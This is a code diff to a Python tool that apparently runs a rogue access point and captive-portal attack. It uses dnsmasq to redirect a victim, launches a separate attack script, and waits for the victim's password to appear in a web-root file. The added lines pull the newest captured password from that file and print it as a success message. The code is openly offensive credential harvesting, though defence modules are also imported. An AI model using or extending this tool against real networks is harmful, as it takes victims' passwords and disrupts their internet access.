@@ -16,10 +16,7 @@ from defence_v1 import defend as def1
 from defence_v3 import defend as def3
 import pymysql.cursors
 
-
-
-                    
-
+got_new_pass = False
 
 def count_file_chars():
     """
@@ -28,10 +25,18 @@ def count_file_chars():
     the captive domain
     """
     char_count = 0
-    with open('./website/passwords.txt', 'r') as file:
+    with open('/var/www/html/passwords.txt', 'r') as file:
         content = file.read().replace(" ", "")
         char_count = len(content)
     return char_count
+
+
+def get_last_password():
+    last_line = "none"
+    with open('/var/www/html/passwords.txt', 'r') as f:
+        for line in f:
+            last_line = line
+    return last_line
 
 
 def start_dnsmasq(attack_inet):
@@ -50,13 +55,14 @@ def start_dnsmasq(attack_inet):
     while current_count == count_file_chars():
         console.print(f'[bold][yellow].[/][/]', end=" ")
         time.sleep(1)
-
     console.print(f'[bold][green]Password received![/][/]')
     console.print(f'[bold][yellow]Renabling internet access for the victim[/][/]')
     p.kill()
     overwrite_dnsconf(attack_inet)
     p = subprocess.Popen(args, stdout=subprocess.PIPE)
     console.print(f'[bold][green]Internet access fully recovered ending the attack[/][/]')
+    global got_new_pass
+    got_new_pass = True
     # out, err = p.communicate()
     # print(out)
 
@@ -114,9 +120,10 @@ while 1:
 
         subprocess.Popen([sys.executable, 'attack.py', str(scan_results[0][0]), str(scan_results[1]), str(virtual_inet), str(scan_results[0][2])], start_new_session=True).pid
         start_dnsmasq(main_inet)
-        """
-        here we need to print the password and stop!!
-        """
+        while not got_new_pass:
+            continue
+        new_pass = get_last_password()
+        console.print(f'[bold][green]\n\nSuccess! got new password!! {new_pass} \n\n[/][/]')
         os.system('clear')
 
     # Defensive Mechanism
